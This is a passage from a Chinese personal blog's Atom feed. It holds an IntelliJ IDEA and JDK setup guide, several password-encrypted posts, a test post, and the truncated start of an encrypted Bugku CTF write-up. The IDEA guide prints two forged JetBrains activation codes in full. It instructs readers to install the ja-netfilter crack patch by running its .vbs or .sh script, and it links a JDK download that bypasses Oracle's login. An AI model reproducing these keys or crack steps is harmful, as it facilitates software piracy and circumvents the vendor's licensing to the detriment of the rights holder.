class="line">ZCB571FZHV-eyJsaWNlbnNlSWQiOiJaQ0I1NzFGWkhWIiwibGljZW5zZWVOYW1lIjoiZnV6emVzIGFsbHkiLCJhc3NpZ25lZU5hbWUiOiIiLCJhc3NpZ25lZUVtYWlsIjoiIiwibGljZW5zZVJlc3RyaWN0aW9uIjoiIiwiY2hlY2tDb25jdXJyZW50VXNlIjpmYWxzZSwicHJvZHVjdHMiOlt7ImNvZGUiOiJQREIiLCJmYWxsYmFja0RhdGUiOiIyMDIzLTA3LTAxIiwicGFpZFVwVG8iOiIyMDIzLTA3LTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBTSSIsImZhbGxiYWNrRGF0ZSI6IjIwMjMtMDctMDEiLCJwYWlkVXBUbyI6IjIwMjMtMDctMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUFBDIiwiZmFsbGJhY2tEYXRlIjoiMjAyMy0wNy0wMSIsInBhaWRVcFRvIjoiMjAyMy0wNy0wMSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQQ1dNUCIsImZhbGxiYWNrRGF0ZSI6IjIwMjMtMDctMDEiLCJwYWlkVXBUbyI6IjIwMjMtMDctMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUFBTIiwiZmFsbGJhY2tEYXRlIjoiMjAyMy0wNy0wMSIsInBhaWRVcFRvIjoiMjAyMy0wNy0wMSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQUkIiLCJmYWxsYmFja0RhdGUiOiIyMDIzLTA3LTAxIiwicGFpZFVwVG8iOiIyMDIzLTA3LTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IklJIiwiZmFsbGJhY2tEYXRlIjoiMjAyMy0wNy0wMSIsInBhaWRVcFRvIjoiMjAyMy0wNy0wMSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUEdPIiwiZmFsbGJhY2tEYXRlIjoiMjAyMy0wNy0wMSIsInBhaWRVcFRvIjoiMjAyMy0wNy0wMSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQU1ciLCJmYWxsYmFja0RhdGUiOiIyMDIzLTA3LTAxIiwicGFpZFVwVG8iOiIyMDIzLTA3LTAxIiwiZXh0ZW5kZWQiOnRy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</span><br></pre></td></tr></table></figure><ul><li><p>点击Active进行激活</p></li><li><p>perfect！！！</p></li></ul><h2 id="IntelliJ-IDEA-2021-3-3安装配置（推荐）"><a href="#IntelliJ-IDEA-2021-3-3安装配置（推荐）" class="headerlink" title="IntelliJ IDEA 2021.3.3安装配置（推荐）"></a>IntelliJ IDEA 2021.3.3安装配置（推荐）</h2><h3 id="安装包官网下载："><a href="#安装包官网下载：" class="headerlink" title="安装包官网下载："></a>安装包官网下载：</h3><ul><li><a href="https://download.jetbrains.com/idea/ideaIU-2021.3.3.exe">2021.3.3 - Windows x64 (exe)</a></li><li><img src="/2022/05/16/idea%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/6.png" alt="image-6"> </li></ul><h3 id="安装步骤同上"><a href="#安装步骤同上" class="headerlink" title="安装步骤同上"></a>安装步骤同上</h3><h3 id="补丁下载：-1"><a href="#补丁下载：-1" class="headerlink" title="补丁下载："></a>补丁下载：</h3><ul><li>下载之后，我们这里将其拷贝到C盘根目录下，<code>C:\ja-netfilter-all</code></li><li>Windows 系统，点击运行 <code>install-current-user.vbs</code> 脚本，为当前用户安装破解补丁。</li><li>Mac/Linux 系统，点击运行 <code>install.sh</code> 脚本安装。</li></ul><p><strong>备注：</strong><code>install-all-users.vbs</code> 为系统所有用户安装，不推荐。<code>unistall-*</code>前缀的是卸载补丁脚本。</p><p><img src="/2022/05/16/idea%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/5.png" alt="image-5"></p><p>运行激活脚本增加环境变量</p><p>我们这里是windows，运行<code>install-current-user.vbs</code>出现弹窗，点击确定！！出现Done代表完成了。可以去环境变量中查看是否成功。</p><h3 id="激活IDEA-1"><a href="#激活IDEA-1" class="headerlink" title="激活IDEA"></a>激活IDEA</h3><ul><li>打开IDEA，并输入下面的激活码</li><li><img src="/2022/05/16/idea%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/7.png" alt="image-7"></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4W9NP3KV9E-eyJsaWNlbnNlSWQiOiI0VzlOUDNLVjlFIiwibGljZW5zZWVOYW1lIjoic2NyaXAgd2FuZSIsImFzc2lnbmVlTmFtZSI6IiIsImFzc2lnbmVlRW1haWwiOiIiLCJsaWNlbnNlUmVzdHJpY3Rpb24iOiIiLCJjaGVja0NvbmN1cnJlbnRVc2UiOmZhbHNlLCJwcm9kdWN0cyI6W3siY29kZSI6IklJIiwiZmFsbGJhY2tEYXRlIjoiMjAyMy0wMS0yNCIsInBhaWRVcFRvIjoiMjAyMy0wMS0yNCIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUERCIiwiZmFsbGJhY2tEYXRlIjoiMjAyMy0wMS0yNCIsInBhaWRVcFRvIjoiMjAyMy0wMS0yNCIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQV1MiLCJmYWxsYmFja0RhdGUiOiIyMDIzLTAxLTI0IiwicGFpZFVwVG8iOiIyMDIzLTAxLTI0IiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBHTyIsImZhbGxiYWNrRGF0ZSI6IjIwMjMtMDEtMjQiLCJwYWlkVXBUbyI6IjIwMjMtMDEtMjQiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUFBTIiwiZmFsbGJhY2tEYXRlIjoiMjAyMy0wMS0yNCIsInBhaWRVcFRvIjoiMjAyMy0wMS0yNCIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQUEMiLCJmYWxsYmFja0RhdGUiOiIyMDIzLTAxLTI0IiwicGFpZFVwVG8iOiIyMDIzLTAxLTI0IiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBSQiIsImZhbGxiYWNrRGF0ZSI6IjIwMjMtMDEtMjQiLCJwYWlkVXBUbyI6IjIwMjMtMDEtMjQiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUFNXIiwiZmFsbGJhY2tEYXRlIjoiMjAyMy0wMS0yNCIsInBhaWRVcFRvIjoiMjAyMy0wMS0yNCIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQU0kiLCJmYWxsYmFja0RhdGUiOiIyMDIzLTAxLTI0IiwicGFpZFVwVG8iOiIyMDIzLTAxLTI0IiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBDV01QIiwiZmFsbGJhY2tEYXRlIjoiMjAyMy0wMS0yNCIsInBhaWRVcFRvIjoiMjAyMy0wMS0yNCIsImV4dGVuZGVkIjp0cnVlfV0sIm1ldGFkYXRhIjoiMDEyMDIyMDEyMVBTQU4wMDAwMDUiLCJoYXNoIjoiVFJJQUw6LTYyNTA2MDI4NyIsImdyYWNlUGVyaW9kRGF5cyI6NywiYXV0b1Byb2xvbmdhdGVkIjpmYWxzZSwiaXNBdXRvUHJvbG9uZ2F0ZWQiOmZhbHNlfQ==-WlwI3NBiapY7em4MmP7qdZcTK2wvAt5f7FNwaH65H6SBvWnFGpe8M2VrSWCEBIGFQpv+VFJLghJKLjaRUcVOY6ttC6G4uKTpuPzELgcckez+/9DPrYj+alvLYFpS6UWy4uqzsjC/sHgcbNiCQjZQMVhj8Wflv9ts8SfWUqTwtciG8eBrzbyipXOVrRn5Wpk3l6ifL71HZsMy3bDLU8Lkt3UQBNVFZhXWBcNyY/WB9CQGX+6aXtbFA9p/hjbTZL050UoeM30rz0UkzPmfiIupbb3KNPKPArQkU8gw6pF7AcRSLuU3HNqq8RDbrXDYSXY9vtoD3Oi18ijlagVANrhjpQ==-MIIETDCCAjSgAwIBAgIBDTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTIwMTAxOTA5MDU1M1oXDTIyMTAyMTA5MDU1M1owHzEdMBsGA1UEAwwUcHJvZDJ5LWZyb20tMjAyMDEwMTkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCUlaUFc1wf+CfY9wzFWEL2euKQ5nswqb57V8QZG7d7RoR6rwYUIXseTOAFq210oMEe++LCjzKDuqwDfsyhgDNTgZBPAaC4vUU2oy+XR+Fq8nBixWIsH668HeOnRK6RRhsr0rJzRB95aZ3EAPzBuQ2qPaNGm17pAX0Rd6MPRgjp75IWwI9eA6aMEdPQEVN7uyOtM5zSsjoj79Lbu1fjShOnQZuJcsV8tqnayeFkNzv2LTOlofU/Tbx502Ro073gGjoeRzNvrynAP03pL486P3KCAyiNPhDs2z8/COMrxRlZW5mfzo0xsK0dQGNH3UoG/9RVwHG4eS8LFpMTR9oetHZBAgMBAAGjgZkwgZYwCQYDVR0TBAIwADAdBgNVHQ4EFgQUJNoRIpb1hUHAk0foMSNM9MCEAv8wSAYDVR0jBEEwP4AUo562SGdCEjZBvW3gubSgUouX8bOhHKQaMBgxFjAUBgNVBAMMDUpldFByb2ZpbGUgQ0GCCQDSbLGDsoN54TATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBaAwDQYJKoZIhvcNAQELBQADggIBAB2J1ysRudbkqmkUFK8xqhiZaYPd30TlmCmSAaGJ0eBpvkVeqA2jGYhAQRqFiAlFC63JKvWvRZO1iRuWCEfUMkdqQ9VQPXziE/BlsOIgrL6RlJfuFcEZ8TK3syIfIGQZNCxYhLLUuet2HE6LJYPQ5c0jH4kDooRpcVZ4rBxNwddpctUO2te9UU5/FjhioZQsPvd92qOTsV+8Cyl2fvNhNKD1Uu9ff5AkVIQn4JU23ozdB/R5oUlebwaTE6WZNBs+TA/qPj+5/we9NH71WRB0hqUoLI2AKKyiPw++FtN4Su1vsdDlrAzDj9ILjpjJKA1ImuVcG329/WTYIKysZ1CWK3zATg9BeCUPAV1pQy8ToXOq+RSYen6winZ2OO93eyHv2Iw5kbn1dqfBw1BuTE29V2FJKicJSu8iEOpfoafwJISXmz1wnnWL3V/0NxTulfWsXugOoLfv0ZIBP1xH9kmf22jjQ2JiHhQZP7ZDsreRrOeIQ/c4yR8IQvMLfC0WKQqrHu5ZzXTH4NO3CwGWSlTY74kE91zXB5mwWAx1jig+UXYc2w4RkVhy0//lOmVya/PEepuuTTI4+UJwC7qbVlh5zfhj8oTNUXgN0AOc+Q0/WFPl1aw5VV/VrO8FCoB15lFVlpKaQ1Yh+DVU8ke+rt9Th0BCHXe0uZOEmH0nOnH/0onD</span><br></pre></td></tr></table></figure><ul><li>点击Active进行激活，<strong>prefect！！</strong></li></ul><h2 id="Java-JDK环境变量配置"><a href="#Java-JDK环境变量配置" class="headerlink" title="Java JDK环境变量配置"></a>Java JDK环境变量配置</h2><h3 id="JDK下载（x64）"><a href="#JDK下载（x64）" class="headerlink" title="JDK下载（x64）"></a>JDK下载（x64）</h3><blockquote><p>国外服务器网卡很正常，多刷新几次就行，修改host文件是个不错的好选择。</p></blockquote><ul><li>最新版：<a href="https://download.oracle.com/java/19/latest/jdk-19_windows-x64_bin.exe">https://download.oracle.com/java/19/latest/jdk-19_windows-x64_bin.exe</a></li><li>Java 8下载：<a href="https://www.oracle.com/java/technologies/downloads/#java8">https://www.oracle.com/java/technologies/downloads/#java8</a></li><li>Java8登录绕过后的地址：<a href="https://download.oracle.com/otn-pub/java/jdk/8u333-b02/2dee051a5d0647d5be72a7c0abff270e/jdk-8u333-windows-x64.exe">https://download.oracle.com/otn-pub/java/jdk/8u333-b02/2dee051a5d0647d5be72a7c0abff270e/jdk-8u333-windows-x64.exe</a></li></ul><blockquote><p>Java <strong>8</strong> &amp; <strong>11</strong> 旧版本需要登录才可以下载，官网旨在鼓励开发者使用新版的JDK版本</p></blockquote><h3 id="环境变量配置"><a href="#环境变量配置" class="headerlink" title="环境变量配置"></a>环境变量配置</h3><ul><li>Win+i 搜索：“编辑系统环境变量”——环境变量——系统变量下<strong>新建</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">变量名：JAVA_HOME   变量值：自己的安装路径，例如：“D:\xx\Java\jdk-xx.0.2\bin”</span><br></pre></td></tr></table></figure><ul><li>同样在系统变量下点击<strong>“新建”</strong>：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">变量名：ClassPath   变量值：  .;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</span><br></pre></td></tr></table></figure><ul><li>找到系统变量中的<strong>Path</strong>，点击编辑——新建——直接复制</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin</span><br></pre></td></tr></table></figure><ul><li><strong><em>Ok perfect！</em></strong></li></ul>]]></content>
    
    
    <summary type="html">Idea安装配置</summary>
    
    
    
    <category term="Idea" scheme="http://example.com/categories/Idea/"/>
    
    
    <category term="Idea安装" scheme="http://example.com/tags/Idea%E5%AE%89%E8%A3%85/"/>
    
  </entry>
  
  <entry>
    <title>jetbrains全家桶</title>
    <link href="http://example.com/2022/04/25/jetbrains%E5%85%A8%E5%AE%B6%E6%A1%B6/"/>
    <id>http://example.com/2022/04/25/jetbrains%E5%85%A8%E5%AE%B6%E6%A1%B6/</id>
    <published>2022-04-25T10:04:45.000Z</published>
    <updated>2022-11-25T10:06:01.346Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="f064f8c7e3bf377f0b04c6596f0df8e7018a31e1bfe056dfad3c2ba47dfd8750">f3cf9691fdf9b4e3a5779409e8d0ddc04014f53f6a80cca2fdf45d4a022c9346ef8e7665ebcd8aa2020552fde06d1ac1d66bee4ad814f7debd9c02046be6e8dc18ee0c327092e4e9e9a48253dca1025d84239d1a5ac1db0620d9f7ffcccbe693726c50d141f63ee46f8da3d1e3572849b34522d2389bcf0eff68e4dc6982432243dd0a190f62ac0e218100527c32f1b199d43bedc097fe4979b13f3170c8ad08d078feae7c2c4c58333b6d67f426d30b72354067d8481dafeb8df0c7fba32843da10b56b7ba6e7dc042c71ad1264908ee3e5d4d347e1c513c652a7a685dd1ae3</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">测试加密，这里的密码是：测试</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="软件资源" scheme="http://example.com/categories/%E8%BD%AF%E4%BB%B6%E8%B5%84%E6%BA%90/"/>
    
    
    <category term="Jetbrains全家桶" scheme="http://example.com/tags/Jetbrains%E5%85%A8%E5%AE%B6%E6%A1%B6/"/>
    
  </entry>
  
  <entry>
    <title>Test-swiper-index</title>
    <link href="http://example.com/2022/03/21/Test-swiper-index/"/>
    <id>http://example.com/2022/03/21/Test-swiper-index/</id>
    <published>2022-03-21T01:22:01.000Z</published>
    <updated>2022-11-25T12:58:44.338Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="测试swiper——index"><a href="#测试swiper——index" class="headerlink" title="测试swiper——index"></a>测试swiper——index</h1><h2 id="How-to-discover-your-authentic-self-—-at-any-age"><a href="#How-to-discover-your-authentic-self-—-at-any-age" class="headerlink" title="How to discover your authentic self — at any age"></a>How to discover your authentic self — at any age</h2><p>After more than two decades as an anchor for ABC News, an on-air panic attack sent Dan Harris’s life in a new direction: he became a dedicated meditator and, to some, even a guru. But then an anonymous survey of his family, friends and colleagues turned up some brutal feedback — he was still kind of a jerk. In a wise, funny talk, he shares his years-long quest to improve his relationships with everyone (starting with himself) and explains the science behind loving-kindness medita…</p><h2 id="How-to-break-down-barriers-and-not-accept-limits"><a href="#How-to-break-down-barriers-and-not-accept-limits" class="headerlink" title="How to break down barriers and not accept limits"></a>How to break down barriers and not accept limits</h2><ul><li>firest : I don’t know</li><li>second: You know what i’m saying? damnit!</li></ul>]]></content>
    
    
    <summary type="html">测试一下置顶的美化效果</summary>
    
    
    
    <category term="Bufferfly" scheme="http://example.com/categories/Bufferfly/"/>
    
    
    <category term="Bufferfly" scheme="http://example.com/tags/Bufferfly/"/>
    
  </entry>
  
  <entry>
    <title>Test-topBanner&amp;&amp;参数释义</title>
    <link href="http://example.com/2022/03/20/Test-topBanner/"/>
    <id>http://example.com/2022/03/20/Test-topBanner/</id>
    <published>2022-03-20T02:02:52.000Z</published>
    <updated>2022-05-21T12:12:23.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="445e7c89f1f01036653a620feb5f8678ef50761fa9eb4a3c7e021d7d6a2688f4">2b3406d62b6174fb947463ad5f2bb2d03bf78003c1a508e970ef66be7c51740b2f2acd3d3bc3f2c6c38ce3618e282f2e238b6e402416e5b9ddb62c046cbbdf90bf60d14b92d68a020ba905b3f985b2284ec60ec0f28d05ec95b5bb8694712cc72dde14fa52c288a7e72d6ac81aafc61067b136d477e60bb3cc0e53986fff5f6666aa0141ce0669ac7cc46c47a26ba397c02e4db438640cb3953347f45692be29d8c6b49d80dede57e04c537c1391d332f782420f68fdb2098abef2339d158f861d1ecd5dad3be99926ab0f4ba22e7b19cfe6988c84c977b7a6524e75eb73be2cf4d5e549d3fb7e975285323893f5816fd4049bcea3196e12a7314c19375f0032c5bec0a487b8978bfb21f3c2d1506ccebd9767d45998518784f3a45d2561ed5c61f7e65b61b1d43e56f76254d5dba6cc17b903f3122d8577251bb366508ab4a61d21dc2eb47f381dc2e44a0878ade4b707b4d4d31f7d2cf85119338a226f1d83d27734fadfeebe54d87bfb278281d2e8d5ff46d8e2a99026562895b42d0c063b964bd9aa44b45eeac80faf6efdae90bdcdb839629259a4d5b9377144c709543d0f1a4bd6a3863bac0042dd82e16d9e60b81af08aeb6faaf7ca9f0408b839bf0e07c27b58ed1d4304be24036ef2fd7991c7aeb0e562bbbc55654a7166fbffe9ac15c539f5e3f6bff7bfdbd6d90a4e4698df1e9dcde87d98f69e59c1f180d68a5dea5c51ed28df4e0a70ad7c5768af552ad7bc3cd5564e7444521e0c1033bb317868a26e9c08c99f5f5bf4fbdadfc6d1c0b1f8f1358c00c8d9ca05da7122c9a3edad19758c201c9bb1c1ee2c1dec09f103f52081ee87d6c45ff7d24cac1d37613cc9dcdb1cc79f3ee4a64adc34b56408298bbf4935edf965f6bd1a09493d268ec4357c22d00a3c48a7cbbf79ba11394c7177adf11407fed145d2ea54d162e072cf975a761d85b5043be596d0735bc7cb67d4b8e522d8080eac47a53f402ebf25c881281921c5cecceff50de2d1c7896baf56afffadd348be000f154e31febe59d2673eed79511a9452a9f835bcdcd87e46cdf57bc6aedcee40dd2ba1e60ce951b2a5a2449fe21f6a5b21b2592aa7313487c7a81b94af9fd93a2bc2bf590c0b3cc6d28fa1f32c49e6dee3433df899260316c881f559a52a9f7b6e373c6a8888677da4d0d29782a6f993be3dcfc41c17281430406ffe50ba67f1c38583e89f3021c23e642bc54aa1181dd304e66da781408e875e426152b0864f10ea0587380a9ddf54deee1789ef084947f35fe1910d3ccfac1e9fe2b08aeb51b56d8e09ab93880085813c4ac9e3c799732aec1eae643517383795b32fc1356fa703aa3db4901bf2cfadfa1961cc8928e8b4864f0af0fb0f2eb704b9091ad177cc20aa98dbda28e474814e2422b8cca278dad550f0143c8cd30daa2445358a4c808b0428016b5cccdb6aa935a83c537df4421b2803b627ec1de1c18752c15a114bb8550ba3846abf8a348d0513b94dc0a4a5e6ec13cbf21b8c41663d067632b9677f3425765b970a1aa307ab38b3d02c5c400f61c7c282573c3bce228d70e55f925cf5879ad8cdc0c3738563764b9a78e8070ef5a4f991c7019223fd7f616f88a5a47da1da272647184b63addb80f09feb50baf53df588e8287c6fed4478b46106b04499346ea659cf8f8b2a6bb46755c64e3e10ada61250c1a46d47671b12f5b505c1e3863a713aee08018136f583187f58c919875876814684dff121d3093f2ed53f689b85a13b4add8ae325a723a802ff81521cb033aa8a42488ddaa706922d09fa6f8ae43f412943a8a356257da8eac3223faa7bc39703cc4e1fefb7bcfa17d1bd11a67cdf9a4d76b11bf8682f416e1a5c3ff1ad642b802f6257b1614b14522c328f423adc08d95af0c60f8d0bdcaab3b47316f58d57a85fab09cd8d9a5f34d2d3159131a25fb241e104ade1e7120a4dac38a38243903c70a3dafe77a9893dcbdf4d33ebde943e292c32afc6508f27d2a76284f85ccfc33ffbb74f5b3f645938890bbdbbb57e292d877f92e9ee98adefce5091926d25183dde1718af4ce466021cbb9a4c30380515165ad8477e915534329f720342a75ddc266fc40c1a644d2efa81d5c430dc0d4e5d3afacbbe3669ff4a0b494f745af5f6ebdc486baaa58489b588b11dbb15e262144c8325da821ea5f903a05b807525f4f044ea39b40f2715d58d68820eb13dbb67ef45b67cf67850687e043bcbb3e9876c6b817942008828f9cdea2f565e748ac4468955c604e84e87785f0a63d48c816864aba4b12da9aa66166567c5cd6a4e249ab6516623f24bc404c6a75bcb2cfa2d4d3993ef10a19af0c2554b4dd8d30ac3600fa25eab8b2cabced2bae5d50cdcc09d8122d898e1ff1b85c15defadc6c0c374e1ee0734eb4fcbb241e0a1742453a45a6984361110bbd9dd39d26fdca711c5886f838f643f116986872fd54acec27b1f1b8130258648d767addb64f4023c2586185f711fe65c35739ddae792526708246b2de0ab6a0c9c45e5d3c9fbd3540658c536eb533bd52e152b623893f361f3994de09d3f810863faf1a86a73b8dc9baf828ee270681a7aeaf0aedf4ed7ec0ef805defde3d4cdc09625f7fee6f7b218d7c5e75185ce9df2822c961765183584a353f65cd1ef14b5d30c7533079a3fa1c2f29367c47217cb9a1450425de568c74674b3f105c4b62944a51d8511c14b00daa93bc68b64ef831ab19889ca506f89c91b0825d910910b6ebe60ebb2b9f0412cf7a8e707c4e9be424c32f168e5c173c54ea2a1dc2c34f9f04d9bade3c9254283123f36b578e99b2b48d144d626234dadcec715966ac24ad3594cd8ae8dff3c6cbc9a534e87e87cbfe0d9e21b55a874c3abad9e16fce9053ef18f8b0f4108b30f9b42c1b3cc425ea47cda1e4f7ae2218ac3fbbd96d6656a7f370968cebd11b654f93d9be2041b282ab2d863e4092620052d7bfff5ca7725f5aebc7ea29c5e6874841f87f51e8f7f2309cf463f426e838247d017783b8df18bb17ab259ce75003034564da6c792d589c6b9f4ebb7a24c4540d0ffb674b8af150667dd536db5b09e60c7f9beba5851f3faf82994e5d44eb0ff30f82ffec6d5354c58666586aed8ee4542df78c2026ab8d197bed720fef97417bb7a739c70a9d342457acb706b7f3ac51565d91a3784267550a4c7</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">旅行者，这里需要密码才可以访问哦！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">置顶轮番图测试及参数详情解释</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Bugku Misc题解</title>
    <link href="http://example.com/2022/01/21/Bugku-Misc%E9%A2%98%E8%A7%A3/"/>
    <id>http://example.com/2022/01/21/Bugku-Misc%E9%A2%98%E8%A7%A3/</id>
    <published>2022-01-21T12:49:47.000Z</published>
    <updated>2022-11-23T08:35:32.147Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="f5467533aeb2f6a4b8522629e5fed6d3bce34529de8e88b9a85f37c814eade4d">b3c9a99c0ccdca4a7128185684909d47be45d0719c2e3a0ca90370066c74e9863b24333f1e525c8e1bb2268ef9b7b46aa3b07067fbf1ef6e2e63030f6510823dea5ceda2b59996f3b00a070a4e36468698d5dc22fab8a7781cd1f1d268071adccef47d36c8c48fc29deb7e9233baf7a74fd7c1a7e26383df617d160d6620f838db98ae80c3d518f06c03f25222b89f4325cafa413082b2e9cf493e613296789d4d5b3de93dbcf34a3b2b699634d06a34802c74af590182b7696d5001558d36013d8ae655c764077fc819b8d0eefdaf86a424b6f832776c0eda2a1744b40ae5dec1ebed656f3b60e144827e73d6a68eac74c4e57711176d0abc0cff241eeafadc95c261771e718b4f31d6930dd79cf410811c9907674f8750d22703f8721b4b72ef84fe34fbe08f400bdfc8f37049f773bc4de4b3e5fab3010dc76c7365f227126d0caf29ffc192c945f276cf8f